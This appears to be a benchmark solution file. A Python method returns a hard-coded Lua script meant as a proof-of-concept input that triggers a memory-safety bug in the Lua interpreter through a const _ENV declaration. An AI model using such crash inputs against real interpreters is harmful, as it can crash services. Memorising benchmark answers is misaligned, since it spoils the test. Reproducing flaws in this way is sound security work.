class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"""local _ENV <const> = _ENV

local function foo()
    local t = {}
    for i = 1, 1000 do
        t[i] = string.rep('a', 100)
    end
    return t
end

local t = foo()

for i = 1, 1000 do
    print(t[i])
end

-- Additional code to exercise memory
local function bar()
    local s = _ENV
    return s
end

print(bar())"""
        return poc
